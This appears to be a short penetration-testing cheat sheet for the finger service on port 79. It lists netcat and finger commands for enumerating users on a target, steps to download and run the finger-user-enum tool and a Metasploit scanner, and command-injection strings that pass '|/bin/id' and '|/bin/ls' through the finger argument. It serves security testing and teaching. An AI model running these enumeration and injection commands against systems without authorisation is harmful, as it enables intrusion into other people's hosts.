# Port 79 - Finger

### Basic Connection

```bash
nc -vn <IP> 79
echo "root" | nc -vn <IP> 79
```

### Enumeration

```bash
finger @<Victim>       #List users
finger admin@<Victim>  #Get info of user
finger user@<Victim>   #Get info of user

# Examples
finger 'a b c d e f g h' @example.com
finger admin@example.com
finger user@example.com
finger 0@example.com
finger .@example.com
finger **@example.com
finger test@example.com
finger @example.com

# Tool
cd /tmp/
wget http://pentestmonkey.net/tools/finger-user-enum/finger-user-enum-1.0.tar.gz
tar -xvf finger-user-enum-1.0.tar.gz
cd finger-user-enum-1.0
perl finger-user-enum.pl -t 10.22.1.11 -U /tmp/rockyou-top1000.txt

# Metasploit
msf > use auxiliary/scanner/finger/finger_users 
msf auxiliary(finger_users) > show actions ...actions... 
msf auxiliary(finger_users) > set ACTION < action-name > 
msf auxiliary(finger_users) > show options ...show and set options... 
msf auxiliary(finger_users) > run

```

### Command Injection

```bash
finger "|/bin/id@example.com"
finger "|/bin/ls -a /@example.com"
```
